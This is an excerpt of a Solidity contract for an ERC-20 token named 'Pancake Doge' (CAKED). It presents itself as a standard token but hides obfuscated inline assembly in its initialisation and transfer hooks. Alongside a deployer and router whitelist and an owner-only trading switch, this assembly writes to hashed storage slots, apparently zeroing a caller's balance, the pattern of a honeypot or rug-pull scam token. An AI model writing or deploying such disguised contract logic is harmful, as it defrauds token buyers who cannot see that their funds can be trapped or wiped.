...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addCake;
    uint256 private panCake = block.number*2;

    mapping (address => bool) private _firstBSC; 
    mapping (address => bool) private _secondETH;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private nuclearOption;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private loserArmy;
    address public pair;
    ...
    bool private trading; uint256 private nailThrower = 1; bool private backBag;
    uint256 private _decimals; uint256 private deathCheater;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addCake.push(_router); addCake.push(msgSender_); addCake.push(pair);
        for (uint256 q=0; q < 3;) {_firstBSC[addCake[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xbd0fe4ba3ecd88c0f53cb5ba3127f9257baf6b25d13fa678d93f710eabade834
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x935f133ac159f282e029d7cfd986410642ebeb751609ae15228e027acd2d463c,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; panCake = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addCake[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployCake(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addCake[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCake(creator, initialSupply);
    }
}

contract PancakeDoge is ERC20Token {
    constructor() ERC20Token("Pancake Doge", "CAKED", msg.sender, 25000000 * 10 ** 18) {
    }
}